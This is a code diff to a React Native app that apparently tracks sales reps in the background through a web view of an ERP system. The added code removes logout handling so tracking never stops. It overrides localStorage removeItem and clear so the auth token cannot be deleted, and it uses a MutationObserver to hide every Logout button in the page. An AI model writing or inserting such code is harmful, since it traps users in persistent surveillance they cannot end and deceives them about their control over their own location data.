@@ -60,13 +60,9 @@ export default function MainScreen() {
           const started = await startBackgroundTracking();
           setTracking(started);
           console.log("[App] Token saved, tracking:", started);
-        } else if (!msg.token && token) {
-          // تسجيل خروج
-          setToken(null);
-          await clearCredentials();
-          await stopBackgroundTracking();
-          setTracking(false);
         }
+        // لا نوقف التتبع أبداً — حتى لو جاء token=null
+        // التتبع يستمر في الخلفية دائماً
       }
     } catch {}
   }, [token]);
@@ -129,6 +125,7 @@ export default function MainScreen() {
         // inject script لمراقبة تغير localStorage
         injectedJavaScriptBeforeContentLoaded={`
           (function() {
+            // ── مراقبة setItem لاستخراج التوكن ──────────────────────
             const orig = Storage.prototype.setItem;
             Storage.prototype.setItem = function(key, value) {
               orig.apply(this, arguments);
@@ -140,13 +137,48 @@ export default function MainScreen() {
                 } catch(e) {}
               }
             };
+
+            // ── منع حذف التوكن (منع تسجيل الخروج) ──────────────────
             const origRemove = Storage.prototype.removeItem;
             Storage.prototype.removeItem = function(key) {
-              origRemove.apply(this, arguments);
               if (key === 'erp-auth') {
-                window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'token', token: null }));
+                console.log('[RepTracker] Logout blocked');
+                return; // تجاهل حذف التوكن
               }
+              origRemove.apply(this, arguments);
             };
+
+            const origClear = Storage.prototype.clear;
+            Storage.prototype.clear = function() {
+              // احفظ التوكن قبل المسح
+              const auth = localStorage.getItem('erp-auth');
+              origClear.apply(this, arguments);
+              if (auth) orig.call(this, 'erp-auth', auth);
+            };
+
+            // ── إخفاء زر تسجيل الخروج في الـ DOM ─────────────────────
+            const hideLogout = () => {
+              // إخفاء أي عنصر يحتوي نص تسجيل الخروج
+              document.querySelectorAll('*').forEach(el => {
+                const text = el.textContent?.trim() || '';
+                if (
+                  (text === 'تسجيل الخروج' || text === 'Logout') &&
+                  el.children.length === 0
+                ) {
+                  const parent = el.closest('button, a, [role="button"]');
+                  if (parent) {
+                    parent.style.display = 'none';
+                  }
+                }
+              });
+            };
+
+            // شغّل عند تحميل الصفحة وعند أي تغيير
+            document.addEventListener('DOMContentLoaded', hideLogout);
+            const observer = new MutationObserver(hideLogout);
+            observer.observe(document.body || document.documentElement, {
+              childList: true, subtree: true
+            });
           })();
           true;
         `}
